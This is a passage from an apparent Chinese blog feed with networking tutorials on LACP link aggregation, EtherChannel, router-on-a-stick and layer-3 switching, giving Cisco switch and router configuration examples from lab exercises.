src="\media\2023\01\链路聚合相关知识3.webp" alt=""></p><ul><li>本端和对端系统优先级</li><li>本端和对端系统ID</li><li>本端和对端的端口操作key</li><li>本端和对端的端口优先级</li><li>本端和对端的端口ID</li><li>本端和对端的端口状态</li></ul><p>就是说，只有当对端和本端的接口数目一样，上面提到的什么优先级，ID，状态，key等东西也都需要一样，这时候才能实现链路聚合</p><h3 id="2-LACP模式"><a href="#2-LACP模式" class="headerlink" title="2. LACP模式"></a>2. LACP模式</h3><p>按照聚合方式的不同，链路聚合可以分为两种模式：静态聚合模式和动态聚合模式。</p><h4 id="1-静态汇聚"><a href="#1-静态汇聚" class="headerlink" title="(1)静态汇聚"></a>(1)静态汇聚</h4><p>我们一般用的也是静态汇聚</p><p>静态LACP汇聚由<strong>用户手工配置</strong>，不允许系统自动添加或删除汇聚组中的端口。</p><p>汇聚组中必须至少包含一个端口，当汇聚组只有一个端口时，只能通过删除汇聚组的方式将该端口从汇聚组中删除。</p><h4 id="2-动态汇聚"><a href="#2-动态汇聚" class="headerlink" title="(2)动态汇聚"></a>(2)动态汇聚</h4><p>动态LACP汇聚是一种<strong>系统自动创建/删除的汇聚</strong>，不允许用户增加或删除动态LACP汇聚中的成员端口。</p><p>只有速率和双工属性相同、连接到同一个设备、有相同基本配置的端口才能被动态汇聚在一起。即使只有一个端口也可以创建动态汇聚，此时为单端口汇聚。</p><p>动态汇聚中，端口的LACP协议处于使能状态。</p><h4 id="3-举例子"><a href="#3-举例子" class="headerlink" title="(3) 举例子"></a>(3) 举例子</h4><p><img src="\media\2023\01\链路聚合相关知识4.webp" alt=""></p><p>我们现在已经将红色和黑色两条链路给聚合成了一条链路，现在在我们又加了一个橙色的链路</p><p><img src="\media\2023\01\链路聚合相关知识5.webp" alt=""></p><p>我们现在想要把橙色的链路加到绿色的链路组中</p><p>如果我们选择动态汇聚，加不了；静态添加可以</p><p><strong>注意：汇聚的是端口</strong></p><h2 id="四-配置LACP"><a href="#四-配置LACP" class="headerlink" title="四. 配置LACP"></a>四. 配置LACP</h2><h3 id="1-指定汇聚协议"><a href="#1-指定汇聚协议" class="headerlink" title="1. 指定汇聚协议"></a>1. 指定汇聚协议</h3><p>先需要指定汇聚协议，在这之前，先需要进入端口（如果只有一个端口，就直接进入一个端口，如果多个端口，就进入范围端口）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int 端口</span><br><span class="line">channel-protocol lacp  // 指定端口协议为lacp</span><br></pre></td></tr></table></figure><h3 id="2-指定聚合模式"><a href="#2-指定聚合模式" class="headerlink" title="2. 指定聚合模式"></a>2. 指定聚合模式</h3><p>我们用的是LACP，所以就不用管PAgP了，直接指定为主动模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">channel-group 1 mode active  </span><br><span class="line">// 静态汇聚有一个组号，所以我们这里定义了一个组，组号为1。这个组的模式是主动模式</span><br><span class="line">// 这个组号就是我们聚合链路的编号，这里可以理解为创建了一个编号为1的聚合链路，模式为主动模式</span><br></pre></td></tr></table></figure><h3 id="3-将聚合通道配置为trunk"><a href="#3-将聚合通道配置为trunk" class="headerlink" title="3. 将聚合通道配置为trunk"></a>3. 将聚合通道配置为trunk</h3><p>我们还需要设置一下trunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int prot-channel 1  // 进入这个聚合链路</span><br><span class="line">switchport mode trunk  // 直接设置为trunk</span><br></pre></td></tr></table></figure><h2 id="五-实验"><a href="#五-实验" class="headerlink" title="五. 实验"></a>五. 实验</h2><h3 id="1-设置聚合链路"><a href="#1-设置聚合链路" class="headerlink" title="1. 设置聚合链路"></a>1. 设置聚合链路</h3><p>我们把两个交换机连上，不配置链路聚合</p><p><img src="\media\2023\01\链路聚合相关知识6.webp" alt=""></p><p>可以看到，F0/1 - F0/1这条链路已经连通了，但是F0/2有一端没通。</p><p>这是因为，没通的那条链路呗当做的备用链路，当F0/1的那条链路断了，就会使用F0/2的那条</p><p>这里交换机的F0/2接口就叫做阻塞接口（BLK），他是不会转发数据的，我们可以这么查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show spanning-tree  // 看生成树数据，下篇文章会讲</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\链路聚合相关知识7.webp" alt=""></p><p>我们现在配置一下LACP，先搞交换机0的F0/1接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int f0/1</span><br><span class="line">channel-protocol lacp  // 设置f0/1端口协议为lacp</span><br><span class="line">channel-group 1 mode active  // 上面讲了，这个其实没啥</span><br><span class="line">int f0/2  // 我们现在要把f0/2接口加进来</span><br><span class="line">channel-protocol lacp  // 和刚才操作一样</span><br><span class="line">channel-group 1 mode active</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\链路聚合相关知识8.webp" alt=""></p><p>我们刚才搞完了交换机0，现在交换机1也要弄一下，刚才是一个一个接口弄的，这次一次性全弄一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int range f0/1-2</span><br><span class="line">channel-protocol lacp</span><br><span class="line">channel-group 1 mode active </span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\链路聚合相关知识9.webp" alt=""></p><p>我们现在看一下两个交换机的接口</p><p><img src="\media\2023\01\链路聚合相关知识10.webp" alt=""></p><p>可以看到和之前的不一样了，全变绿色了，说明成功了</p><p>我们现在可以看一下生成树了</p><p><img src="\media\2023\01\链路聚合相关知识13.webp" alt=""></p><p>可以看到，我们最开始的两个接口没了，整合到了一个链路里头</p><h3 id="2-不同VLAN怎么传"><a href="#2-不同VLAN怎么传" class="headerlink" title="2. 不同VLAN怎么传"></a>2. 不同VLAN怎么传</h3><p>现在加几个主机</p><p><img src="\media\2023\01\链路聚合相关知识11.webp" alt=""></p><p>我们现在这个网络只能传递同VLAN的数据，现在VLAN1发数据在聚合链路通过，VLAN2也发数据，也从聚合链路通过，那么这个数据怎么通过呢？</p><p>聚合链路其实可以做到负载均衡的效果，就是说VLAN 1从F0/1走，VLAN 2从F0/2走。但是前提是链路得trunk。</p><p>如果想要配置trunk的话，我们直接进入通道设置就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int port-channel 1  // 进入编号为1的通道</span><br><span class="line">switchport mode trunk  // 直接常规设置就行了</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\链路聚合相关知识12.webp" alt=""></p><p>然后对面的交换机也设置一下。</p><p>这样所有的接口trunk了，进而链路为trunk。</p><h3 id="3-通信测试"><a href="#3-通信测试" class="headerlink" title="3. 通信测试"></a>3. 通信测试</h3><p>我们把设备都连上，简单ping一下。这里就不搞VLAN了，没啥演示意义，自己搞搞就行了。</p><p>我们配置一下IP就行，一个是192.68.10.1，一个是192.168.10.2</p><p><img src="\media\2023\01\链路聚合相关知识17.webp" alt=""></p><h2 id="六-配以太网通道"><a href="#六-配以太网通道" class="headerlink" title="六. 配以太网通道"></a>六. 配以太网通道</h2><p>还有一种更简单的方式，直接配以太网通道。</p><p>还是这样的网络</p><p><img src="\media\2023\01\链路聚合相关知识14.webp" alt=""></p><p>我们直接把交换机5的F0/1和F0/2两个接口配置为以太网通道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int range f0/1-2</span><br><span class="line">channel-group 5 mode on</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\链路聚合相关知识15.webp" alt=""></p><p>我们再配置一下交换机6的接口，然后再看一下生成树。</p><p><img src="\media\2023\01\链路聚合相关知识16.webp" alt=""></p><p>可以看到也创建成功了。</p><p>想要通信的话，记得配一下trunk，操作和上面一样，就是聚合链路的编号不同。</p><p>不过要注意一下，<strong>以太网通道最多能捆绑8条链路</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单臂路由和三层交换机</title>
      <link href="/2023/02/16/1/"/>
      <url>/2023/02/16/1/</url>
      
        <content type="html"><![CDATA[<p>在交换机网络中，要想跨交换机实现相同VLAN通信可以用VLAN trunk，那么不同VLAN之间应该怎么通信呢？</p><p>因为不同VLAN是属于不同的广播域，配置的是不同的网段IP，针对于不同网段的IP进行通信，就需要加一个路由，或者其他技术。</p><p>目前实现不同VLAN间的通信有两种，一种叫做单臂路由，一种叫做三层交换</p><h2 id="一-单臂路由"><a href="#一-单臂路由" class="headerlink" title="一. 单臂路由"></a>一. 单臂路由</h2><h3 id="1-简单介绍"><a href="#1-简单介绍" class="headerlink" title="1. 简单介绍"></a>1. 简单介绍</h3><p>我们想要实现不同VLAN之间的通信，可以加一个路由器</p><p><img src="\media\2023\01\单臂路由和三层交换机1.webp" alt=""></p><p>主机A向主机B通信，我们可以加上网关，这样数据就会通过交换机传给路由器，然后路由器再经过一系列的处理再把数据通过交换机传给主机B</p><p>那么这里有问题了</p><p>我们目前两个VLAN都连了路由器的同一个物理接口，那么这个接口属于哪个VLAN的？</p><p>交换机想要转发任何VLAN数据，就必须配置为trunk，但是路由器接口又不能配置trunk，因为路由器是路由接口，而trunk是交换接口。</p><p>解决这两个问题，我们可以依据路由器的物理接口去划分子接口。</p><p>比如我们路由器的接口是0/1，我们0模块不变，子接口是划分1.1，就是0/1.1，0/1.2，0/1.3等等。</p><p>子接口划分后还需要接口重新封装，比如0/1.1封装成VLAN 10，0/1.2封装成VLAN 20。所以0/1.1就是VLAN 10的网关，0/1.2就是VLAN 20的网关。</p><h3 id="2-数据传输过程"><a href="#2-数据传输过程" class="headerlink" title="2. 数据传输过程"></a>2. 数据传输过程</h3><p><img src="\media\2023\01\单臂路由和三层交换机2.webp" alt=""></p><p>以上图为例，PC0需要发送数据给P1，发现PC1和自己不是同一个网段，这时将数据交给自己的网关，网关为路由器0的F0/0.1子接口。通过ARP协议获取自己网关的MAC地址，数据会通过交换机进行转发。</p><p>到了交换机之后，会为收到的数据打上VLAN 10标签，将数据传到路由器0。</p><p>路由器0收到数据，结合路由器的工作原理，查看目的IP地址，找到对应接口，再进行标签转换，再发送到交换机。</p><p>这时交换机收到的就是打上VLAN 20标签数据，根据交换的mac地址表的对应关系直接转发</p><p>简单来说就是：数据给交换机，交换机上标签，找接口给路由器，变标签，再给交换机，交换机拆标签，通过MAC找主机。</p><h3 id="3-实验"><a href="#3-实验" class="headerlink" title="3. 实验"></a>3. 实验</h3><p><img src="\media\2023\01\单臂路由和三层交换机3.webp" alt=""></p><p>有这么一个网络</p><h4 id="1-交换机配置"><a href="#1-交换机配置" class="headerlink" title="(1) 交换机配置"></a>(1) 交换机配置</h4><p>我们先给交换机配置VLAN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">exit</span><br><span class="line">vlan 20</span><br><span class="line">end</span><br><span class="line">show vlan brief</span><br></pre></td></tr></table></figure><p>然后添加接口到VLAN里头，0/1是VLAN 10，0/2是VLAN 20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">inf f0/1</span><br><span class="line">switchport access vlan 10</span><br><span class="line">int f0/2</span><br><span class="line">switchport access vlan 20</span><br><span class="line">int f0/3  // 这个接口别忘了</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure><p>看一下VLAN配置</p><p><img src="\media\2023\01\单臂路由和三层交换机4.webp" alt=""></p><p>再看一下trunk链路</p><p><img src="\media\2023\01\单臂路由和三层交换机5.webp" alt=""></p><h4 id="2-路由器配置"><a href="#2-路由器配置" class="headerlink" title="(2) 路由器配置"></a>(2) 路由器配置</h4><p>交换机配置好了就可以配置路由器了</p><p>进入后有个这个东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Would you like to enter the initial configuration dialog? [yes/no]:</span><br></pre></td></tr></table></figure><p>输入no就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int g0/0.1  // 直接进入0.1接口就行</span><br><span class="line">encapsulation dot1Q 10  // 将目前的接口，即g0/0.1接口，使用中继封装，封装为VLAN 10接口</span><br><span class="line">ip add 192.168.10.254 255.255.255.0  // 配置子接口的IP</span><br><span class="line">// 注意，子接口IP配置后不用no shutdown</span><br><span class="line">exit</span><br><span class="line">int g0/0.2</span><br><span class="line">encapsulation dot1Q 20  // 将g0/0.2接口封装为VLAN 20的接口</span><br><span class="line">ip add 192.168.20.254 255.255.255.0</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>这个过程挺简单的，进入子接口，设置封装模式，配置IP就行了，但是别忘了还有一个接口，把g0/0接口开起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int g0/0</span><br><span class="line">no shutdown  // 就开开就行了</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机6.webp" alt=""></p><p>可以看到它开了3个接口，一个物理接口和两个子接口</p><h4 id="3-配置DHCP或者静态IP"><a href="#3-配置DHCP或者静态IP" class="headerlink" title="(3) 配置DHCP或者静态IP"></a>(3) 配置DHCP或者静态IP</h4><p>我这里就配置一下DHCP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ip dhcp pool vlan10  // 创建DHCP池</span><br><span class="line">network 192.168.10.0 255.255.255.0  // 确定网络访范围</span><br><span class="line">default-router 192.168.10.254  // 配置网关地址</span><br><span class="line">exit</span><br><span class="line">// 这里还得再配置VLAN 20的</span><br><span class="line">ip dhcp pool vlan20  </span><br><span class="line">network 192.168.20.0 255.255.255.0  </span><br><span class="line">default-router 192.168.20.254 </span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这样就配置好了</p><h4 id="4-获取IP"><a href="#4-获取IP" class="headerlink" title="(4) 获取IP"></a>(4) 获取IP</h4><p>我们获取一下</p><p><img src="\media\2023\01\单臂路由和三层交换机7.webp" alt=""></p><p><img src="\media\2023\01\单臂路由和三层交换机8.webp" alt=""></p><p>两台主机全部获取IP成功</p><h4 id="5-ping一下"><a href="#5-ping一下" class="headerlink" title="(5) ping一下"></a>(5) ping一下</h4><p>我们拿PC0去ping PC1</p><p><img src="\media\2023\01\单臂路由和三层交换机9.webp" alt=""></p><p>可以看见，这两个不同VLAN的设备可以ping通了。</p><p>我们仿真模式看一下</p><p><img src="\media\2023\01\单臂路由和三层交换机10.webp" alt=""></p><p>可以看到数据由PC0 -&gt; 交换机0 -&gt; 路由器0 -&gt; 交换机0 -&gt;PC1实现数据传输，PC1 -&gt; 交换机0 -&gt; 路由器0 -&gt; 交换机0 -&gt; PC0实现回应。</p><h2 id="二-三层交换"><a href="#二-三层交换" class="headerlink" title="二. 三层交换"></a>二. 三层交换</h2><p>通过在交换机上划分vlan，想要实现不同van间的通信，这时候就可以使用三层交换来解决。</p><p>但是既然有了单臂路由，为啥有会有三层交换呢？</p><p>单臂路由容易形成网络瓶颈，子接口依托于物理接口，当VLAN过多时，物理接口的压力就会过大。</p><p>单臂路由主要是利用路由器的转发，每一次数据来了之后都需要进行路由，路由器的工作量比较大</p><h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h3><p>三层交换机技术：二层交换机技术+三层转发技术</p><h4 id="1-传统的三层交换"><a href="#1-传统的三层交换" class="headerlink" title="(1) 传统的三层交换"></a>(1) 传统的三层交换</h4><h5 id="1、简单介绍"><a href="#1、简单介绍" class="headerlink" title="1、简单介绍"></a>1、简单介绍</h5><p>传统的三层交换和单臂路由的原理是有一点点类似的，一般成为“一次路由，多次交换”</p><p><img src="\media\2023\01\单臂路由和三层交换机11.webp" alt=""></p><p>VLAN 1向VLAN 2发送数据，我们数据帧的格式有帧头，IP头部，数据和CRC。</p><p>数据帧通过0/1接口发到三层交换的时候，有一个解封装的过程。</p><p>三层交换会发现目的的MAC地址和源MAC地址不是同一个广播域，这时候他就会交给自己的三层引擎（就是图中的R1）处理进行重新封装，同时记录一下三层交换的条目，封装完后再重新转发。</p><p>我们可以把三层引擎重新封装的过程看作是一个路由的过程</p><p>这是第一次，当进行第二次通信的时候，就不用再一次路由了，直接通过三层交换的条目转发就行了。这就是所谓的“一次路由，多次交换”</p><h5 id="2、工作原理"><a href="#2、工作原理" class="headerlink" title="2、工作原理"></a>2、工作原理</h5><p><strong>三层交换机上，第3层引擎处理数据流的第一个包</strong></p><p><img src="\media\2023\01\单臂路由和三层交换机12.webp" alt=""></p><p>这里有一个ARP请求与响应的过程，主要是来请求目的方的MAC地址，这个过程可以先不用管</p><p><strong>交换ASIC从3层引擎中获悉2层重写信息在硬件中创建一个MLS条目，负责重写和转发数据流中的后续数据包</strong></p><p>这个MLS就是三层交换意思，这个过程就是写三层交换条目，然后负责让以后的包不用路由直接通过MLS条目转发就行了</p><h4 id="2-基于CEF的MLS（三层交换）"><a href="#2-基于CEF的MLS（三层交换）" class="headerlink" title="(2) 基于CEF的MLS（三层交换）"></a>(2) 基于CEF的MLS（三层交换）</h4><h5 id="1、简单介绍-1"><a href="#1、简单介绍-1" class="headerlink" title="1、简单介绍"></a>1、简单介绍</h5><p>传统的三层交换有路由的过程，有路由就会存在路由表。</p><p>CEF是根据路由表中的信息，直接去生成邻接关系表，直接进行硬件转发。（通过IP转发叫逻辑转发，通过MAC转发叫硬件转发）</p><p>所以这里是维护了两张表，由路由表（转发信息库/FIB表）生成了邻接关系表（里面主要是MAC地址信息）</p><h5 id="2、工作原理-1"><a href="#2、工作原理-1" class="headerlink" title="2、工作原理"></a>2、工作原理</h5><p>主机A给B发送单播数据包</p><p>交换机查找FIB表，找到下一跳地址</p><p>查找下一跳地址对应的邻接关系的2层封装信息</p><p>转发</p><p><img src="\media\2023\01\单臂路由和三层交换机13.webp" alt=""></p><h5 id="3、虚接口"><a href="#3、虚接口" class="headerlink" title="3、虚接口"></a>3、虚接口</h5><p>看下面这张图</p><p><img src="\media\2023\01\单臂路由和三层交换机14.webp" alt=""></p><p>主机A属于VLAN 1，主机B属于VLAN 2。</p><p>现在主机A向主机B通信，数据会先进入交换机，由于数据来自于VLAN 1接口，他就会进入VLAN 1虚接口，然后进入VLAN 2虚接口，然后进入VLAN 2，在到主机B。</p><p>所以VLAN 1虚接口可以认为主机A的网关，通过VLAN 2虚接口就是主机B的网关。</p><p>还有一种情况。</p><p><img src="\media\2023\01\单臂路由和三层交换机15.webp" alt=""></p><p>交换机A全是trunk接口，但是它还不能和主机直接相连，因为直连是access接口。所以需要再加一个二层交换机。</p><p>主机A向主机B发送数据，进到二层交换机的VLAN1接口，再通过trunk口进到交换机A，在进入到VLAN1虚接口，传到VLAN2虚接口，再重新返回到交换机A的trunk接口，再返回到二层交换机，再通过VLAN 2发送到主机B。</p><h3 id="2-三层交换配置"><a href="#2-三层交换配置" class="headerlink" title="2. 三层交换配置"></a>2. 三层交换配置</h3><h4 id="1-实验一"><a href="#1-实验一" class="headerlink" title="(1) 实验一"></a>(1) 实验一</h4><p>我们看这个网络</p><p><img src="\media\2023\01\单臂路由和三层交换机16.webp" alt=""></p><p>我们首先得在三层交换机上创建VLAN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后我们需要把1-14接口加到VLAN 10，155-24接口加到VLAN 20</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int range f0/1-14</span><br><span class="line">switchport access vlan 10</span><br><span class="line">exit</span><br><span class="line">int range f0/15-24</span><br><span class="line">switchport access vlan 20</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机17.webp" alt=""></p><p>我们这里是把物理接口加入到了VLAN，但是我们还需要虚接口，而且他还需要作为主机的网关，所以还得给它分配IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int vlan 10  //进入VLAN 10</span><br><span class="line">ip add 192.168.10.254 255.255.255.0  // 正常配置IP就行了</span><br><span class="line">no shutdown</span><br><span class="line">exit</span><br><span class="line">int vlan 20</span><br><span class="line">ip add 192.168.20.254 255.255.255.0</span><br><span class="line">no shutdown</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机18.webp" alt=""></p><p><img src="\media\2023\01\单臂路由和三层交换机19.webp" alt=""></p><p>我们配置虚接口后，我们还得要配置一下路由功能，思科设备默认是不开的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip routing</span><br></pre></td></tr></table></figure><p>配置完成后我们设置一下DHCP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ip dhcp pool vlan10</span><br><span class="line">network 192.168.10.0 255.255.255.0</span><br><span class="line">default-router 192.168.10.254</span><br><span class="line">exit</span><br><span class="line">ip dhcp pool vlan20</span><br><span class="line">network 192.168.20.0 255.255.255.0</span><br><span class="line">default-router 192.168.20.254</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>我们查看一下dhcp设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip dhcp pool</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机20.webp" alt=""></p><p>检查一下发现没有问题，我们现在就去配置桌面DHCP一下</p><p><img src="\media\2023\01\单臂路由和三层交换机21.webp" alt=""></p><p><img src="\media\2023\01\单臂路由和三层交换机22.webp" alt=""></p><p>我们这时候就可以ping了，用PC0去ping PC1</p><p><img src="\media\2023\01\单臂路由和三层交换机23.webp" alt=""></p><p>可以发现能够ping通</p><p>我们这时候看一下交换机的路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show ip route</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机24.webp" alt=""></p><p>可以看到这里有两条直连路由</p><h4 id="2-实验二"><a href="#2-实验二" class="headerlink" title="(2) 实验二"></a>(2) 实验二</h4><p><img src="\media\2023\01\单臂路由和三层交换机25.webp" alt=""></p><p>这就是我们在”虚接口”中讲的第二种情况。这时三层交换机全是trunk接口</p><p>我们先配置二层交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">交换机0配置</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">int f0/1</span><br><span class="line">switchport access vlan 10</span><br><span class="line">int f0/2</span><br><span class="line">switchport mode trunk</span><br><span class="line">// 这里并不需要创建VLAN 20，因为直连的只有一个VLAN 10。不过你创建了也没关系</span><br><span class="line"></span><br><span class="line">交换机1配置</span><br><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 20</span><br><span class="line">int f0/1</span><br><span class="line">switchport access vlan 20</span><br><span class="line">int f0/2</span><br><span class="line">switchport mode trunk</span><br></pre></td></tr></table></figure><p>我们再配置一下三层交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">vlan 10</span><br><span class="line">vlan 20</span><br><span class="line">exit</span><br><span class="line">int range f0/1-2</span><br><span class="line">sw mo trunk</span><br><span class="line">exit</span><br><span class="line">int vlan 10</span><br><span class="line">ip add 192.168.10.254 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">exit</span><br><span class="line">int vlan 20</span><br><span class="line">ip add 192.168.20.254 255.255.255.0</span><br><span class="line">no shut</span><br><span class="line">exit</span><br><span class="line">ip dhcp pool vlan10</span><br><span class="line">network 192.168.10.0 255.255.255.0</span><br><span class="line">default-router 192.168.10.254</span><br><span class="line">exit</span><br><span class="line">ip dhcp pool vlan20</span><br><span class="line">network 192.168.20.0 255.255.255.0</span><br><span class="line">default-router 192.168.20.254</span><br><span class="line">exit</span><br><span class="line">ip routing</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\单臂路由和三层交换机26.webp" alt=""></p><p>结果发现这里出错了，他没有变成trunk，不用管，协商之后还是trunk</p><p>然后就是主机设置DHCP了，可能会出现DHCP请求失败的情况，这时候等一会儿，再重新设置成DHCP就行了</p><p><img src="\media\2023\01\单臂路由和三层交换机27.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟局域网VLAN相关知识</title>
      <link href="/2023/02/16/28/"/>
      <url>/2023/02/16/28/</url>
      
